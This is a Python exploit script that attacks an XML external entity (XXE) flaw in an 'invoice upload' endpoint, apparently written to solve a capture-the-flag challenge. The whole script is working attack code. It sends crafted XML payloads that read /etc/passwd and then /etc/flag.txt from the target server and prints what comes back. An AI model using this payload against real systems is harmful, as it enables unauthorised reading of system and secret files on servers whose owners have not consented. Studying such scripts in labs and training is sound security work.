#!/usr/bin/env python3
import requests
import sys
import urllib.parse

def exploit_xxe(url):
    """
    Exploit XXE vulnerability in the invoice service
    """
    try:
        # XXE payload to read /etc/passwd
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE foo [
        <!ELEMENT foo ANY >
        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
        <foo>&xxe;</foo>"""
        
        # Send the request
        headers = {
            'Content-Type': 'application/xml'
        }
        
        response = requests.post(f"{url}/invoice/upload", data=xxe_payload, headers=headers)
        
        # Check if we got the flag
        if "TELISP{" in response.text:
            print("[+] Success! Found flag:")
            print(response.text.split("TELISP{")[1].split("}")[0])
            return True
        elif "root:" in response.text:
            print("[+] Success! XXE worked, got /etc/passwd:")
            print(response.text[:200])  # Print first 200 chars
            
            # Try to read the flag file
            flag_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
            <!DOCTYPE foo [
            <!ELEMENT foo ANY >
            <!ENTITY xxe SYSTEM "file:///etc/flag.txt" >]>
            <foo>&xxe;</foo>"""
            
            flag_response = requests.post(f"{url}/invoice/upload", data=flag_payload, headers=headers)
            if "TELISP{" in flag_response.text:
                print("[+] Found flag in /etc/flag.txt:")
                print(flag_response.text.split("TELISP{")[1].split("}")[0])
                return True
        else:
            print("[-] XXE attack failed")
            return False
            
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 xxe.py <target_url>")
        sys.exit(1)
        
    target_url = sys.argv[1]
    
    print("[*] Attempting XXE attack...")
    exploit_xxe(target_url) 